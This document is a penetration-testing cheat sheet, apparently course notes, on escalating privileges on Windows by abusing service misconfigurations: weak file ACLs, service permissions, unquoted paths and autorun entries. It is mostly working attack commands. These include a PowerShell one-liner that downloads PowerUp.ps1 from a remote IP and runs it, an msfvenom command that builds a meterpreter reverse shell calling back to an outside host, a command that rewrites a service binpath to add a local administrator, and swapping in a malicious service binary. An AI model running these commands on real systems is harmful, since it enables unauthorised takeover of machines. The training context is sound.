Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. As penetration testers, we need to understand how permissions work in Windows and the various ways that misconfigurations can be leveraged to escalate privileges. The permissions-related flaws discussed in this section are relatively uncommon in software applications put out by large vendors (but are seen from time to time) but are common in third-party software from smaller vendors, open-source software, and custom applications. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system. Regardless of the environment, we should always check for weak permissions and be able to do it both with the help of tools and manually in case we are in a situation where we don't have our tools readily available.

### Permissive File System ACLs
We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs
```powershell
.\SharpUp.exe audit
```

Or PowerUp
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.15.155/PowerUp.ps1');Invoke-Allchecks
```

Check permissions with `icals`
```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Replace service binary with malicious SecurityService.exe
```powershell
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

### Weak Service Permissions
SharpHound
```powershell
.\SharpUp.exe audit
```
 PowerUp
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.15.155/PowerUp.ps1');Invoke-Allchecks
```
View services manual
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Check service permissions
```powershell
accesschk.exe /accepteula
```

Change binpath to add new local admin
```powershell
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

Restart service
```powershell
sc stop WindscribeService
sc start WindscribeService
shutdown /r /t 0
```
##### Cleanup
```powershell
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### Unquoted Service Paths
When the service is started Windows looks through every word in the path separated with a space and tes**t .exe**

- C:\Program.exe - NO
- C:\Program Files.exe - NO    
- C:\Program Files\Unquoted.exe - NO
- C:\Program Files\Unquoted Path.exe - NO

And so on...

PowerUp discovery
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.15.155/PowerUp.ps1');Invoke-Allchecks
```

Manual discovery
```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

Check service
```powershell
C:\htb> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Drop malicious executable under `C:\Program Files (x86)\System Explorer` as `System.exe` because of the space

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=1337 -f exe -o System.exe
```

### Modifiable Registry Autorun Binary
Check for startup services/binaries
```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

This [post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) and [this site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems.